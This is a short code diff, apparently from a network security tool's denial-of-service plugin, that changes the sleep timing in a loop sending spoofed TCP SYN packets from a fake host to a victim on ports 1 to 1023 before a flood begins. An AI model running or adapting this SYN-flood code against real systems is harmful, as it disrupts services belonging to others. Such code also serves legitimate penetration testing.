@@ -162,14 +162,14 @@ EC_THREAD_FUNC(syn_flooder)
    struct timespec tm;
 
    tm.tv_sec = 0;
-   tm.tv_nsec = 500*1000;
+   tm.tv_nsec = 1000*1000;
    /* init the thread and wait for start up */
    ec_thread_init();
  
    /* First "scan" ports from 1 to 1024 */
    for (dport=1; dport<1024; dport++) {
       send_tcp(&fake_host, &victim_host, sport++, htons(dport), seq++, 0, TH_SYN);
-      usleep(1000);
+      nanosleep(&tm, NULL);
    }
 
    INSTANT_USER_MSG("dos_attack: Starting attack...\n");
